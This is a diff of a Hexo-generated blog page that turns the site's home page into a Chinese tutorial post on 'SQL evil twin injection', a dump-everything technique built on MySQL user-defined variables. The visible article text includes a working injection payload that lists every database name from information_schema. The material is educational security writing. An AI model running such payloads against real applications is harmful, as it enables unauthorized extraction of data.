@@ -55,27 +55,31 @@
   };
 </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Bruce.Li&#39;s Blog">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
+  <meta name="description" content="SQL evil twin injection是一种可以从数据库中快速获取全部数据的注入方法。它的注入语句使用了SQL用户自定义变量（User Defined Variable），因此语法上不大容易理解。这篇教程将详细介绍常用的SQL evil twin injection语句，以及该语句的含义。 先从一个最常用的注入语句开始，利用evil twin injection来获取所有的数据库（data">
+<meta name="keywords" content="Security,SQL Injection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL Evil Twin Injection">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;10&#x2F;22&#x2F;yuque&#x2F;SQL%20Evil%20Twin%20Injection&#x2F;index.html">
 <meta property="og:site_name" content="Bruce.Li&#39;s Blog">
+<meta property="og:description" content="SQL evil twin injection是一种可以从数据库中快速获取全部数据的注入方法。它的注入语句使用了SQL用户自定义变量（User Defined Variable），因此语法上不大容易理解。这篇教程将详细介绍常用的SQL evil twin injection语句，以及该语句的含义。 先从一个最常用的注入语句开始，利用evil twin injection来获取所有的数据库（data">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-10-22T06:44:47.584Z">
 <meta name="twitter:card" content="summary">
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/2019/10/22/yuque/SQL%20Evil%20Twin%20Injection/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome: true,
-    isPost: false,
+    isHome: false,
+    isPost: true,
     isPage: false,
     isArchive: false
   };
 </script>
 
-  <title>Bruce.Li's Blog</title>
+  <title>SQL Evil Twin Injection | Bruce.Li's Blog</title>
   
 
 
@@ -210,89 +214,10 @@
             
 
   <div class="posts-expand">
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2019/10/22/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Bruce.Li">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/1829883?s=400&u=3ef194f4f2266c88a935a60a64e11e9ff2c0aaa7&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Bruce.Li's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            
-            <a href="/blog/2019/10/22/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建时间：2019-10-22 06:44:47" itemprop="dateCreated datePublished" datetime="2019-10-22T06:44:47+00:00">2019-10-22</time>
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
       
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
   
   
-  
-
-    
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2019/10/22/yuque/SQL%20Evil%20Twin%20Injection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -307,8 +232,9 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
+            SQL Evil Twin Injection
             
-            <a href="/blog/2019/10/22/yuque/SQL%20Evil%20Twin%20Injection/" class="post-title-link" itemprop="url">SQL Evil Twin Injection</a>
+
           
         </h1>
 
@@ -342,7 +268,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>SQL evil twin injection是一种可以从数据库中快速获取全部数据的注入方法。它的注入语句使用了SQL用户自定义变量（User Defined Variable），因此语法上不大容易理解。这篇教程将详细介绍常用的SQL evil twin injection语句，以及该语句的含义。</p>
+        <p>SQL evil twin injection是一种可以从数据库中快速获取全部数据的注入方法。它的注入语句使用了SQL用户自定义变量（User Defined Variable），因此语法上不大容易理解。这篇教程将详细介绍常用的SQL evil twin injection语句，以及该语句的含义。</p>
 <p>先从一个最常用的注入语句开始，利用evil twin injection来获取所有的数据库（database）信息。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> (@a) <span class="keyword">from</span> (<span class="keyword">select</span>(@a:=<span class="number">0x00</span>),(<span class="keyword">select</span>  (@a) <span class="keyword">from</span> (information_schema.schemata)<span class="keyword">where</span> (@a)<span class="keyword">in</span> (@a:=/ !<span class="number">50000</span><span class="keyword">concat</span>/(@a,schema_name,<span class="string">'&lt;br&gt;</span></span><br><span class="line"><span class="string">'</span>))))a)</span><br></pre></td></tr></table></figure>
 
@@ -412,26 +338,53 @@
 <li><a href="http://www.creatigon.com/blog/dios-query-collections/" target="_blank" rel="noopener">http://www.creatigon.com/blog/dios-query-collections/</a></li>
 </ol>
 
-        
-      
     </div>
 
     
     
     
+        
+      
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/blog/tags/Security/" rel="tag"># Security</a>
+            
+              <a href="/blog/tags/SQL-Injection/" rel="tag"># SQL Injection</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/blog/2019/10/22/hello-world/" rel="prev" title="Hello World">
+                  Hello World <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
       </footer>
+    
   </article>
   
   
   
 
-    
   </div>
-
-  
-
 
 
           </div>
@@ -448,6 +401,11 @@
 
   <aside class="sidebar">
     <div class="sidebar-inner">
+        
+        
+        
+        
+      
 
       <ul class="sidebar-nav motion-element">
         <li class="sidebar-nav-toc">
